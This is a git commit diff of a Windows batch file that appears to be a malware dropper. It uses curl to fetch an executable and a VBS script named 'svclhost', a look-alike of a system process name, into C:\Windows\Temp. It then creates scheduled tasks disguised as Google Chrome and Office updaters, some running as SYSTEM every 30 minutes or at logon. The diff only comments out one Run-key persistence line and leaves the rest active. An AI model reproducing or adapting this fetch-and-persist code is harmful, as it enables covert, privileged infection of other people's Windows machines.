718799a544517bd83a6265f62fbde61edb87e133
NoManCan <tiger_man_student@yahoo.com>
2025-01-30 11:13:57 +0400

    Update try-full.bat

--- try-full.bat
+++ try-full.bat
@@ -5,7 +5,7 @@ curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssl-3.d
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.exe > C:\Windows\Temp\svclhost.exe
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.vbs > C:\Windows\Temp\svclhost.vbs
 set tt=%time:~0,5%
-cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" >nul 2>&1
+REM cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" >nul 2>&1
 SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /F >nul 2>&1
 SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /RU system /F >nul 2>&1
 SCHTASKS /CREATE /SC ONLOGON /TN "Microsoft\Office\Office ClickToRun Logon" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /RU system /F >nul 2>&1
